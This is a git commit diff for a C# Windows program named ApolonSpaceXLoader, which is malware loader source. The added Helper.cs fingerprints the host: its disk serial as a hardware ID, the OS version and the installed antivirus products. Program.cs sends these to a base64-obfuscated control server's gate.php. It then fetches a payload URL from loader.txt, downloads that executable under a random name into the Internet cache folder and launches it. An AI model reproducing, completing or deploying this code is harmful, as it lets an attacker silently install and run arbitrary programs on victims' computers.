0f9f489ca675d1f875eac36be43cdf05107229f9
Yato29 <egor.puchoK@yandex.ru>
2020-06-03 12:19:23 +0300

    Update & fix

---
+++ Sources/ApolonSpaceXLoader/Helper.cs
@@ -0,0 +1,82 @@
+﻿namespace ApolonSpaceXLoader
+{
+    using System;
+    using System.Management;
+    using System.Security.Cryptography;
+
+    class Helper
+    {
+        public static string HWID()
+        {
+            string str = string.Empty;
+            try
+            {
+                string str2 = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
+                using (ManagementObject obj1 = new ManagementObject("win32_logicaldisk.deviceid=\"" + str2 + ":\""))
+                {
+                    obj1.Get();
+                    str = obj1["VolumeSerialNumber"]?.ToString();
+                }
+            }
+            catch{}
+            return str;
+        }
+
+        public static string GetOSInformation()
+        {
+            foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
+            {
+                ManagementObject managementObject = (ManagementObject)managementBaseObject;
+                try
+                {
+                    return string.Concat(new string[]
+                    {
+                    (string)managementObject["Version"]
+                    });
+                }
+                catch{}
+            }
+            return "BIOS Maker: Unknown";
+        }
+
+        public static string AV()
+        {
+            var searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
+            string gn = string.Empty;
+            foreach (ManagementObject queryObj in searcher.Get())
+            {
+                string displayName = (string)queryObj["displayName"];
+                gn += ($"{displayName}, ");
+            }
+            return gn;
+        }
+
+        // https://ipconfig.ws/threads/%D0%9A%D0%BB%D0%B0%D1%81%D1%81-%D0%B4%D0%BB%D1%8F-%D0%B3%D0%B5%D0%BD%D0%B5%D1%80%D0%B0%D1%86%D0%B8%D0%B8-%D1%80%D0%B0%D0%BD%D0%B4%D0%BE%D0%BC%D0%BD%D1%8B%D1%85-%D1%81%D1%82%D1%80%D0%BE%D0%BA.53/
+        public static string RandomID(int length)
+        {
+            char[] identifier = new char[length];
+            byte[] randomData = new byte[length];
+
+            using (var rng = new RNGCryptoServiceProvider())
+            {
+                rng.GetBytes(randomData);
+            }
+
+            for (int idx = 0; idx < identifier.Length; idx++)
+            {
+                identifier[idx] = AvailableCharacters[randomData[idx] % AvailableCharacters.Length];
+            }
+
+            return new string(identifier);
+        }
+
+        private static readonly char[] AvailableCharacters =
+        {
+           'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
+           'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
+           'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
+           'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
+           '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_'
+        };
+    }
+}
--- Sources/ApolonSpaceXLoader/Program.cs
+++ Sources/ApolonSpaceXLoader/Program.cs
@@ -4,54 +4,77 @@ using System.Text;
 using System.Diagnostics;
 using System.Threading;
 using System.IO;
-using System.Threading.Tasks;
 
 namespace ApolonSpaceXLoader
 {
     class Program
     {
-        private static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("Encrypt domen"));  // use EncrDecr for encrypt your link on URL page. http://apolon.com -> aHR0cDovL2Fwb2xvbi5jb20vZ2F0ZS5waHA/
-        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}";
-        public static string urlPage = dom + "/loader.txt";
+        private static EventWaitHandle ewh;
+        private static long threadCount = 0;
+        private static EventWaitHandle clearCount = new EventWaitHandle(false, EventResetMode.AutoReset);
 
+        private static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("Domain"));  // use EncrDecr for encrypt your link on URL page. http://apolon.com -> aHR0cDovL2Fwb2xvbi5jb20vZ2F0ZS5waHA/
+        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}";
+        public static string urlPage = string.Concat(dom, "/loader.txt");
+
+        [MTAThread]
         static void Main(string[] args)
         {
-            try
+            MyRegistry.Check();
+            ewh = new EventWaitHandle(false, EventResetMode.AutoReset);
+
+            Thread t = new Thread(Work);
+            t.Start();
+
+            while (Interlocked.Read(ref threadCount) < 1)
             {
-                while (true)
+                Thread.Sleep(3000);
+            }
+
+            while (Interlocked.Read(ref threadCount) > 0)
+            {
+                WaitHandle.SignalAndWait(ewh, clearCount);
+            }
+        }
+
+        private static void Work()
+        {
+            string rnd = Helper.RandomID(6);
+            string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";
+
+            string urlOnPage;
+            using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
+            {                
+                urlOnPage = strr.ReadToEnd();
+            }
+
+            using (WebClient wc = new WebClient())
+            {
+                ewh.WaitOne();                
+                if (MyRegistry.GetURL() != null)
                 {
-                    WebClient wc = new WebClient();
-                    string rnd = Helper.RandomID();
-                    string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";
-
-                    string urlOnPage;
-                    using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
+                    if (MyRegistry.GetURL() != urlOnPage)
                     {
-                        urlOnPage = strr.ReadToEnd();
-                    }
-
-                    MyRegistry.Check();
-                    if (MyRegistry.GetURL() != null)
-                    {
-                        if (MyRegistry.GetURL() != urlOnPage)
+                        if (File.Exists($"{dropPath}\\{rnd}.exe"))
                         {
-                            if (File.Exists($"{dropPath}\\{rnd}.exe"))
+                            File.Delete($"{dropPath}\\{rnd}.exe");
+                        }
+                        MyRegistry.SetURL(urlOnPage);
+                        if (urlOnPage.Length > 0)
+                        {
+                            try
                             {
-                                File.Delete($"{dropPath}\\{rnd}.exe");
-                            }
-                            MyRegistry.SetURL(urlOnPage);
-                            if (urlOnPage.Length > 0)
-                            {
-                                wc.DownloadFile(urlOnPage, $"{dropPath}\\{rnd}.exe");
+                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
+                                wc.DownloadFileAsync(new Uri(urlOnPage), $"{dropPath}\\{rnd}.exe");
                                 Process.Start($"{dropPath}\\{rnd}.exe");
                             }
+                            catch { }
                         }
                     }
-                    wc.Dispose();
-                    Thread.Sleep(3000);
-                }
+                }                
+                wc.Dispose();
+                clearCount.Set();                
             }
-            catch { }
         }
     }
 }
